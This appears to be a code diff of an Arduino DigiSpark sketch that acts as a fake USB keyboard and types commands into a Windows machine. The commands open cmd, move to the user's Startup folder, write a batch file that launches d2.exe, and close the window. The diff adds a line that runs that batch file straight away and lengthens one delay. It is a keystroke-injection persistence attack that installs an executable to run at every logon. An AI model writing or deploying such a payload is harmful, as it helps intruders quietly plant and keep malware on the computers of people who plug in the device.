@@ -10,7 +10,7 @@ void setup() {
 
 
   DigiKeyboard.println("cmd");
-  delay(1000);
+  delay(2000);
 
 
   DigiKeyboard.println("cd \"%USERPROFILE%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup\" ");
@@ -27,7 +27,8 @@ void setup() {
   delay(1000);
   DigiKeyboard.println("echo start d2.exe >> r.bat");
   delay(1000);
-
+  DigiKeyboard.println("r.bat");
+  delay(2000);
 
   DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
 }
